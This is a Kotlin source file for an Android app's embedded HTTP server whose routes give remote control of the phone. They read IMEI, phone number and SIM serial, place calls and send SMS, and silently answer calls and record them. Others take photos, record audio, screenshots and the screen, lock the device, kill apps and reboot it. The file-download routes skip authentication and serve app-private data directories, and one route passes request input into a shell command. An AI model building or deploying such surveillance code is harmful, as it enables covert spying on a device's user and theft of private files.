package com.xiangqin.app.server

import com.xiangqin.app.XiangQinApp
import com.xiangqin.app.service.MonitoringService
import android.content.Context
import io.ktor.http.*
import io.ktor.server.application.*
import io.ktor.server.request.*
import io.ktor.server.response.*
import io.ktor.server.routing.*

internal fun Route.deviceRoutes(app: XiangQinApp, context: Context, service: MonitoringService, auth: AuthModule) {
    post("/api/settings/password") {
        if (!auth.checkAuth(call)) return@post
        val body = try { call.receive<PasswordChangeRequest>() } catch (_: Exception) {
            call.respond(HttpStatusCode.BadRequest, mapOf("error" to "invalid body")); return@post
        }
        if (body.oldPassword != app.dataStore.getWebPassword()) {
            call.respond(HttpStatusCode.Forbidden, mapOf("error" to "old password mismatch")); return@post
        }
        if (body.newPassword.length < 4) {
            call.respond(HttpStatusCode.BadRequest, mapOf("error" to "password too short")); return@post
        }
        app.dataStore.setWebPassword(body.newPassword)
        call.respond(MessageResponse("password updated"))
    }

    // ── 日历 ──
    post("/api/calendar/add") {
        if (!auth.checkAuth(call)) return@post
        try {
            val text = call.receiveText()
            val title = Regex(""""title"\s*:\s*"([^"]*)"""").find(text)?.groupValues?.get(1) ?: "提醒"
            val startMs = Regex(""""startTime"\s*:\s*(\d+)""").find(text)?.groupValues?.get(1)?.toLongOrNull() ?: System.currentTimeMillis()
            val endMs = Regex(""""endTime"\s*:\s*(\d+)""").find(text)?.groupValues?.get(1)?.toLongOrNull() ?: (startMs + 3600000)
            val values = android.content.ContentValues().apply {
                put(android.provider.CalendarContract.Events.CALENDAR_ID, 1)
                put(android.provider.CalendarContract.Events.TITLE, title)
                put(android.provider.CalendarContract.Events.DTSTART, startMs)
                put(android.provider.CalendarContract.Events.DTEND, endMs)
                put(android.provider.CalendarContract.Events.EVENT_TIMEZONE, java.util.TimeZone.getDefault().id)
            }
            val uri = context.contentResolver.insert(android.provider.CalendarContract.Events.CONTENT_URI, values)
            call.respond(MessageResponse("日历事件已添加: $title"))
        } catch (e: Exception) {
            call.respondText("""{"error":"${escapedJson(e.message ?: "add event failed")}"}""", ContentType.Application.Json)
        }
    }

    // ── 媒体清理 ──
    post("/api/media/cleanup") {
        if (!auth.checkAuth(call)) return@post
        try {
            val before = app.database.mediaFileDao().getAll().size
            app.database.mediaFileDao().deleteAll()
            val indexer = com.xiangqin.app.monitor.MediaIndexer(context)
            indexer.sync()
            val after = app.database.mediaFileDao().countByType("image") +
                app.database.mediaFileDao().countByType("video") +
                app.database.mediaFileDao().countByType("audio")
            call.respond(MessageResponse("清理完成 (before=$before, after=$after)"))
        } catch (e: Exception) {
            call.respondText("""{"error":"${escapedJson(e.message ?: "")}"}""", ContentType.Application.Json)
        }
    }

    // ── 媒体文件下载 ──
    get("/api/media/file") {
        val path = call.request.queryParameters["path"] ?: run {
            call.respondText("""{"error":"missing path"}""", ContentType.Application.Json, HttpStatusCode.BadRequest); return@get
        }
        val file = java.io.File(path)
        val canonicalPath = try { file.canonicalPath } catch (_: Exception) { path }
        val allowed = canonicalPath.startsWith("/sdcard") || canonicalPath.startsWith("/storage") || canonicalPath.startsWith("/data/user/0") || canonicalPath.startsWith("/data/data") || canonicalPath.startsWith(context.filesDir.absolutePath)
        if (!allowed) { call.respond(HttpStatusCode.Forbidden, mapOf("error" to "access denied")); return@get }
        if (!file.exists() || !file.isFile) { call.respond(HttpStatusCode.NotFound, mapOf("error" to "file not found")); return@get }
        try { call.respondFile(file) } catch (_: Exception) { call.respond(HttpStatusCode.NotFound, mapOf("error" to "file read failed")) }
    }
    get("/api/files/{path...}") {
        val segments = call.parameters.getAll("path") ?: run {
            call.respondText("""{"error":"missing path"}""", ContentType.Application.Json, HttpStatusCode.BadRequest); return@get
        }
        val filePath = segments.joinToString("/")
        val file = java.io.File(filePath)
        val canonicalPath = file.canonicalPath
        val allowed = canonicalPath.startsWith("/sdcard") || canonicalPath.startsWith("/storage") || canonicalPath.startsWith("/data/user/0") || canonicalPath.startsWith("/data/data") || canonicalPath.startsWith(context.filesDir.absolutePath)
        if (!allowed) { call.respond(HttpStatusCode.Forbidden, mapOf("error" to "access denied")); return@get }
        if (file.exists() && file.isFile) {
            val mime = resolveContentType(filePath)
            try { call.respondBytes(file.readBytes(), contentType = mime) }
            catch (_: Exception) { call.respond(HttpStatusCode.NotFound, mapOf("error" to "file read failed")) }
        } else { call.respond(HttpStatusCode.NotFound, mapOf("error" to "file not found")) }
    }

    // ── 设备管理员 ──
    get("/api/device/admin/status") {
        if (!auth.checkAuth(call)) return@get
        call.respond(DeviceAdminStatusResponse(active = isDeviceAdmin(context)))
    }

    // ── 设备信息 ──
    get("/api/device/info") {
        if (!auth.checkAuth(call)) return@get
        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
            val imei = try { @Suppress("DEPRECATION") tm.deviceId } catch (_: Exception) { "N/A" }
            val phoneNum = try { @Suppress("DEPRECATION") tm.line1Number } catch (_: Exception) { "N/A" }
            val simOp = try { tm.simOperatorName } catch (_: Exception) { "N/A" }
            val simSer = try { tm.simSerialNumber } catch (_: Exception) { "N/A" }
            val netType = try { @Suppress("DEPRECATION") tm.networkType } catch (_: Exception) { -1 }
            val dataSt = try { @Suppress("DEPRECATION") tm.dataState } catch (_: Exception) { -1 }
            val roaming = try { tm.isNetworkRoaming } catch (_: Exception) { false }
            call.respond(DeviceInfoResponse(
                modelName = android.os.Build.MODEL, brand = android.os.Build.BRAND,
                device = android.os.Build.DEVICE, androidVersion = android.os.Build.VERSION.RELEASE,
                sdkVersion = android.os.Build.VERSION.SDK_INT,
                imei = imei, phoneNumber = phoneNum, simOperator = simOp, simSerial = simSer,
                networkType = netType, dataState = dataSt, isNetworkRoaming = roaming,
                batteryLevel = getBatteryLevel(context), isCharging = isCharging(context)
            ))
        } catch (e: Exception) {
            call.respondText("""{"error":"${escapedJson(e.message ?: "unknown")}"}""", ContentType.Application.Json)
        }
    }

    // ── 设备清理 ──
    post("/api/device/clean") {
        if (!auth.checkAuth(call)) return@post
        try {
            val body = try { call.receive<Map<String, Any>>() } catch (_: Exception) { emptyMap<String, Any>() }
            val type = body["type"] as? String ?: "cache"
            var cleaned = 0L
            when (type) {
                "cache" -> { val d = context.cacheDir; if (d.exists()) { cleaned = d.walkTopDown().filter { it.isFile }.sumOf { it.length() }; d.deleteRecursively() } }
                "temp" -> { val d = java.io.File(java.io.File.pathSeparator, "tmp"); if (d.exists() && d.isDirectory) { cleaned = d.walkTopDown().filter { it.isFile }.sumOf { it.length() }; d.listFiles()?.forEach { it.deleteRecursively() } } }
                "screenshots" -> { val d = java.io.File(context.filesDir, "screenshot"); if (d.exists()) { cleaned = d.walkTopDown().filter { it.isFile }.sumOf { it.length() }; d.deleteRecursively() } }
            }
            call.respond(MessageResponse("已清理 ${cleaned / 1024}KB"))
        } catch (e: Exception) {
            call.respond(HttpStatusCode.InternalServerError, mapOf("error" to (e.message ?: "清理失败")))
        }
    }

    // ── 远程通话 ──
    post("/api/device/call") {
        if (!auth.checkAuth(call)) return@post
        try {
            val body = call.receive<Map<String, String>>()
            val phoneNumber = body["phoneNumber"] ?: run {
                call.respondText("""{"error":"missing phoneNumber"}""", ContentType.Application.Json); return@post
            }
            val intent = android.content.Intent(android.content.Intent.ACTION_CALL, android.net.Uri.parse("tel:$phoneNumber"))
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
            call.respond(MessageResponse("正在拨号: $phoneNumber"))
        } catch (e: Exception) {
            call.respondText("""{"error":"${escapedJson(e.message ?: "拨号失败")}"}""", ContentType.Application.Json)
        }
    }
    post("/api/device/hangup") {
        if (!auth.checkAuth(call)) return@post
        try {
            val telecom = context.getSystemService(Context.TELECOM_SERVICE) as android.telecom.TelecomManager
            @Suppress("DEPRECATION") telecom.endCall()
            call.respond(MessageResponse("电话已挂断"))
        } catch (e: Exception) {
            try { Runtime.getRuntime().exec("input keyevent KEYCODE_ENDCALL"); call.respond(MessageResponse("电话已挂断(endCall)")) }
            catch (e2: Exception) { call.respondText("""{"error":"${escapedJson(e.message ?: "挂断失败")}"}""", ContentType.Application.Json) }
        }
    }
    post("/api/device/answer-call") {
        if (!auth.checkAuth(call)) return@post
        try {
            Runtime.getRuntime().exec(arrayOf("input", "keyevent", "KEYCODE_CALL"))
            Thread.sleep(500)
            service.audioRecorder.start(context)
            call.respond(MessageResponse("通话已接听，正在录音"))
        } catch (e: Exception) {
            call.respondText("""{"error":"${escapedJson(e.message ?: "answer failed")}"}""", ContentType.Application.Json)
        }
    }

    // ── 远程短信 ──
    post("/api/device/sms") {
        if (!auth.checkAuth(call)) return@post
        try {
            val body = call.receive<Map<String, String>>()
            val phoneNumber = body["phoneNumber"] ?: run { call.respond(HttpStatusCode.BadRequest, mapOf("error" to "missing phoneNumber")); return@post }
            val message = body["message"] ?: run { call.respond(HttpStatusCode.BadRequest, mapOf("error" to "missing message")); return@post }
            val smsManager = android.telephony.SmsManager.getDefault()
            smsManager.sendTextMessage(phoneNumber, null, message, null, null)
            call.respond(MessageResponse("短信已发送到: $phoneNumber"))
        } catch (e: Exception) {
            call.respond(HttpStatusCode.InternalServerError, mapOf("error" to (e.message ?: "发送失败")))
        }
    }

    // ── 震动 ──
    post("/api/device/vibrate") {
        if (!auth.checkAuth(call)) return@post
        try {
            val text = call.receiveText()
            val duration = Regex(""""duration"\s*:\s*(\d+)""").find(text)?.groupValues?.get(1)?.toLongOrNull() ?: 500L
            val am = context.getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
            @Suppress("DEPRECATION") am.vibrate(duration)
            call.respond(MessageResponse("震动已触发 (${duration}ms)"))
        } catch (e: Exception) {
            call.respondText("""{"error":"${escapedJson(e.message ?: "震动失败")}"}""", ContentType.Application.Json)
        }
    }
    post("/api/device/flashlight") {
        if (!auth.checkAuth(call)) return@post
        try {
            val text = call.receiveText()
            val on = text.contains("\"on\":true") || text.contains("\"on\": true")
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager
            val cameraId = cameraManager.cameraIdList.firstOrNull() ?: run {
                call.respondText("""{"error":"无可用摄像头"}""", ContentType.Application.Json); return@post
            }
            cameraManager.setTorchMode(cameraId, on)
            call.respond(MessageResponse(if (on) "手电筒已开启" else "手电筒已关闭"))
        } catch (e: Exception) {
            call.respondText("""{"error":"${escapedJson(e.message ?: "手电筒操作失败")}"}""", ContentType.Application.Json)
        }
    }
    post("/api/device/alarm") {
        if (!auth.checkAuth(call)) return@post
        try {
            val text = call.receiveText()
            val hour = Regex(""""hour"\s*:\s*(\d+)""").find(text)?.groupValues?.get(1)?.toIntOrNull() ?: run {
                call.respondText("""{"error":"missing hour"}""", ContentType.Application.Json); return@post
            }
            val minute = Regex(""""minute"\s*:\s*(\d+)""").find(text)?.groupValues?.get(1)?.toIntOrNull() ?: 0
            val am = context.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
            val alarmIntent = android.content.Intent("com.xiangqin.app.ALARM_WAKEUP")
            val pendingIntent = android.app.PendingIntent.getBroadcast(context, hour * 60 + minute, alarmIntent, android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE)
            val cal = java.util.Calendar.getInstance().apply {
                set(java.util.Calendar.HOUR_OF_DAY, hour); set(java.util.Calendar.MINUTE, minute); set(java.util.Calendar.SECOND, 0)
                if (timeInMillis <= System.currentTimeMillis()) add(java.util.Calendar.DAY_OF_MONTH, 1)
            }
            am.setExactAndAllowWhileIdle(android.app.AlarmManager.RTC_WAKEUP, cal.timeInMillis, pendingIntent)
            call.respond(MessageResponse("闹钟已设置: ${hour}:${"%02d".format(minute)}"))
        } catch (e: Exception) {
            call.respond(HttpStatusCode.InternalServerError, mapOf("error" to (e.message ?: "设置闹钟失败")))
        }
    }
    post("/api/device/kill") {
        if (!auth.checkAuth(call)) return@post
        try {
            val body = try { call.receive<Map<String, Any>>() } catch (_: Exception) { emptyMap<String, Any>() }
            val packageName = body["packageName"] as? String
            if (packageName != null) {
                val intent = android.content.Intent(android.content.Intent.ACTION_MAIN)
                intent.addCategory(android.content.Intent.CATEGORY_HOME)
                intent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                context.startActivity(intent)
                Runtime.getRuntime().exec("am force-stop $packageName")
                call.respond(MessageResponse("已停止应用: $packageName"))
            } else {
                val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
                @Suppress("DEPRECATION") val procs = am.runningAppProcesses ?: emptyList()
                val pkg = context.packageName
                var killed = 0
                for (proc in procs) { if (proc.processName != pkg && proc.importance >= 300) { am.killBackgroundProcesses(proc.processName); killed++ } }
                call.respond(MessageResponse("已清理 $killed 个后台进程"))
            }
        } catch (e: Exception) {
            call.respond(HttpStatusCode.InternalServerError, mapOf("error" to (e.message ?: "操作失败")))
        }
    }
    post("/api/device/reboot") {
        if (!auth.checkAuth(call)) return@post
        try { Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot")); call.respond(MessageResponse("设备即将重启")) }
        catch (e: Exception) { call.respond(HttpStatusCode.InternalServerError, mapOf("error" to (e.message ?: "重启失败，可能需要 Root 权限"))) }
    }
    post("/api/device/shutdown") {
        if (!auth.checkAuth(call)) return@post
        try { Runtime.getRuntime().exec(arrayOf("su", "-c", "shutdown -h now")); call.respond(MessageResponse("设备即将关机")) }
        catch (e: Exception) { call.respond(HttpStatusCode.InternalServerError, mapOf("error" to (e.message ?: "关机失败，可能需要 Root 权限"))) }
    }

    // ── 截屏 ──
    post("/api/device/screenshot") {
        if (!auth.checkAuth(call)) return@post
        try {
            val a11yRunning = com.xiangqin.app.service.PermissionAccessibilityService.isRunning()
            if (a11yRunning) {
                val bmp = kotlinx.coroutines.withTimeoutOrNull(8000L) {
                    kotlinx.coroutines.suspendCancellableCoroutine<android.graphics.Bitmap?> { cont ->
                        com.xiangqin.app.service.PermissionAccessibilityService.screenshot { bitmap -> cont.resume(bitmap, onCancellation = {}) }
                    }
                }
                if (bmp != null) {
                    val w = bmp.width / 2; val h = bmp.height / 2
                    val scaled = android.graphics.Bitmap.createScaledBitmap(bmp, w, h, true)
                    val dir = java.io.File(context.filesDir, "screenshot"); dir.mkdirs()
                    val file = java.io.File(dir, "latest.jpg")
                    file.outputStream().use { scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 50, it) }
                    scaled.recycle(); bmp.recycle()
                    call.respond(ScreenshotResponse(file.absolutePath, file.length()))
                } else { call.respondText("""{"error":"screenshot failed"}""", ContentType.Application.Json) }
            } else {
                try {
                    val dir = java.io.File(context.filesDir, "screenshot"); dir.mkdirs()
                    val file = java.io.File(dir, "latest.jpg")
                    val process = Runtime.getRuntime().exec(arrayOf("screencap", "-p", file.absolutePath))
                    val exitCode = process.waitFor()
                    if (exitCode == 0 && file.exists() && file.length() > 100) call.respond(ScreenshotResponse(file.absolutePath, file.length()))
                    else call.respondText("""{"error":"screenshot failed"}""", ContentType.Application.Json)
                } catch (_: Exception) { call.respondText("""{"error":"screenshot failed, a11y not running"}""", ContentType.Application.Json) }
            }
        } catch (e: Exception) {
            call.respondText("""{"error":"${escapedJson(e.message ?: "failed")}"}""", ContentType.Application.Json)
        }
    }
    post("/api/device/screenrecord") {
        if (!auth.checkAuth(call)) return@post
        try {
            val bodyText = call.receiveText()
            val action = if (bodyText.contains("stop")) "stop" else "start"
            if (action == "start") {
                if (com.xiangqin.app.service.ScreenRecordingService.isRecording()) { call.respondText("""{"error":"已经在录制中"}""", ContentType.Application.Json, HttpStatusCode.BadRequest); return@post }
                call.respond(ScreenRecordStartResponse("请在手机上点击\"开始录屏\"按钮授权屏幕录制", requireAuth = true))
            } else {
                if (com.xiangqin.app.service.ScreenRecordingService.isRecording()) {
                    com.xiangqin.app.service.ScreenRecordingManager.stop(context)
                    val recordings = java.io.File(context.filesDir, "recordings").listFiles()?.filter { it.name.startsWith("recording_") && it.name.endsWith(".mp4") }?.sortedByDescending { it.lastModified() }
                    val latest = recordings?.firstOrNull()
                    call.respondText("""{"message":"录屏已停止","file":"${latest?.absolutePath ?: ""}","size":${latest?.length() ?: 0}}""", ContentType.Application.Json)
                } else { call.respond(MessageResponse("当前没有录制")) }
            }
        } catch (e: Exception) {
            call.respondText("""{"error":"录屏失败: ${escapedJson(e.message ?: "")}"}""", ContentType.Application.Json, HttpStatusCode.InternalServerError)
        }
    }
    get("/api/device/screenrecord/status") {
        if (!auth.checkAuth(call)) return@get
        val isRecording = com.xiangqin.app.service.ScreenRecordingService.isRecording()
        val outputFile = com.xiangqin.app.service.ScreenRecordingService.getOutputFile()
        call.respond(ScreenRecordStatusResponse(recording = isRecording, file = outputFile?.absolutePath ?: ""))
    }

    // ── 锁屏/解锁 ──
    post("/api/device/lock") {
        if (!auth.checkAuth(call)) return@post
        try {
            val locked = com.xiangqin.app.receiver.XiangQinDeviceAdminReceiver.lockScreen(context)
            if (locked) call.respond(MessageResponse("lock success"))
            else call.respondText("""{"error":"device admin not active","hint":"请在手机设置中激活设备管理器"}""", ContentType.Application.Json, HttpStatusCode.BadRequest)
        } catch (e: Exception) {
            call.respondText("""{"error":"${escapedJson(e.message ?: "lock failed")}"}""", ContentType.Application.Json, HttpStatusCode.InternalServerError)
        }
    }
    post("/api/device/unlock") {
        if (!auth.checkAuth(call)) return@post
        try {
            val km = context.getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
            if (km.isKeyguardLocked) {
                val intent = android.content.Intent(android.content.Intent.ACTION_MAIN)
                intent.addCategory(android.content.Intent.CATEGORY_HOME); intent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                context.startActivity(intent)
            }
            call.respond(MessageResponse("unlock sent"))
        } catch (e: Exception) {
            call.respondText("""{"error":"${escapedJson(e.message ?: "unlock failed")}"}""", ContentType.Application.Json)
        }
    }

    // ── 远程拍照/录音 ──
    post("/api/camera/capture") {
        if (!auth.checkAuth(call)) return@post
        try {
            val photoPath = service.cameraCapture.capturePhoto()
            if (photoPath != null) {
                val file = java.io.File(photoPath)
                val recording = com.xiangqin.app.data.db.PhotoEntity(filePath = photoPath, fileSize = file.length(), takenTime = System.currentTimeMillis(), triggerSource = "remote")
                app.database.photoDao().insert(recording)
                call.respond(CameraCaptureResponse("拍照成功", photoPath, recording.id))
            } else { call.respondText("""{"error":"拍照失败，请检查相机权限"}""", ContentType.Application.Json) }
        } catch (e: Exception) {
            call.respondText("""{"error":"${escapedJson(e.message ?: "拍照失败")}"}""", ContentType.Application.Json)
        }
    }
    get("/api/camera/photos") {
        if (!auth.checkAuth(call)) return@get
        try {
            val photos = app.database.photoDao().getRecent(50)
            call.respond(PhotoListResponse(photos, photos.size))
        } catch (_: Exception) { call.respond(PhotoListResponse(emptyList(), 0)) }
    }
    post("/api/audio/start") {
        if (!auth.checkAuth(call)) return@post
        try {
            val path = service.audioRecorder.start(context)
            if (path != null) call.respond(MessageResponse("录音已开始"))
            else call.respondText("""{"error":"录音启动失败，请检查麦克风权限"}""", ContentType.Application.Json)
        } catch (e: Exception) {
            call.respondText("""{"error":"${escapedJson(e.message ?: "录音启动失败")}"}""", ContentType.Application.Json)
        }
    }
    post("/api/audio/stop") {
        if (!auth.checkAuth(call)) return@post
        try {
            val result = service.audioRecorder.stop()
            if (result != null) {
                val recording = com.xiangqin.app.data.db.AudioRecordingEntity(filePath = result.filePath, durationMs = result.durationMs, fileSize = result.fileSize, recordedTime = System.currentTimeMillis(), triggerSource = "remote")
                app.database.audioRecordingDao().insert(recording)
                call.respond(AudioStopResponse("录音已停止", result.filePath, result.durationMs, result.fileSize, recording.id))
            } else { call.respondText("""{"error":"没有正在进行的录音"}""", ContentType.Application.Json) }
        } catch (e: Exception) {
            call.respondText("""{"error":"${escapedJson(e.message ?: "停止失败")}"}""", ContentType.Application.Json)
        }
    }
    get("/api/audio/recordings") {
        if (!auth.checkAuth(call)) return@get
        try {
            val recordings = app.database.audioRecordingDao().getRecent(50)
            call.respond(AudioRecordingListResponse(recordings, recordings.size))
        } catch (_: Exception) { call.respond(AudioRecordingListResponse(emptyList(), 0)) }
    }
}

private fun isDeviceAdmin(context: Context): Boolean {
    return try {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val cn = android.content.ComponentName(context, com.xiangqin.app.receiver.XiangQinDeviceAdminReceiver::class.java)
        dpm.isAdminActive(cn)
    } catch (_: Exception) { false }
}

private fun getBatteryLevel(context: Context): Int = try {
    val intent = context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
    val level = intent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
    val scale = intent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
    if (level < 0 || scale < 0) -1 else (level * 100 / scale)
} catch (_: Exception) { -1 }

private fun isCharging(context: Context): Boolean = try {
    val intent = context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
    val status = intent?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
    status == android.os.BatteryManager.BATTERY_STATUS_CHARGING || status == android.os.BatteryManager.BATTERY_STATUS_FULL
} catch (_: Exception) { false }
